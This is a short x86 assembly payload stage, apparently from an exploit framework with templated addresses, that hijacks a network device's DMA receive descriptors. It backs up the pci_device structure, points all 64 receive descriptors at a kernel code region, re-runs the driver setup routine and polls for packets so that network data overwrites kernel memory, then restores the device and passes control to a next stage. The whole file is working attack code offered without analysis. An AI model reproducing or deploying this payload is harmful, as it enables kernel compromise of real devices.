[bits 32]

; stager passes session_info as arg1
;  - grab pci_device ptr from session_info and store it in esi
mov esi, [esp+4]
mov esi, [esi+8]

; backup the pci_device structure
call geteip
geteip:
pop edi
add edi, saved_device-geteip

push edi
push esi

mov ecx, 0x1000
rep movsb

pop esi
push esi

; there are 64 receive descriptors in the device structure
mov ecx, 64

; set the physical DMA address for each descriptor to the target kernel code region
mov eax, esi
descFixup:
mov dword [0x640+eax], 0
mov dword [0x644+eax], ${kernel_target}
add eax, 12
dec ecx
jnz descFixup

; call the setup_device_handler function to update the DMA addresses based on our modified structure
push 0x0
push esi
mov eax, ${setup_device_handler}
call eax
add esp, 8

; call recv a bunch of times to give us a chance to get the packet
mov ecx, 0x1000000

recvLoop:
push ecx
push esi
mov eax, ${check_recv_pkt}
call eax
add esp, 4
pop ecx
dec ecx
jnz recvLoop

; restore original pci_device
pop edi
pop esi
push edi

mov ecx, 0x1000
rep movsb

; update the receive descriptors with their original values again
pop esi
push 0x0
push esi
mov eax, ${setup_device_handler}
call eax
add esp, 8

; continue to the next stage
ret


saved_device:
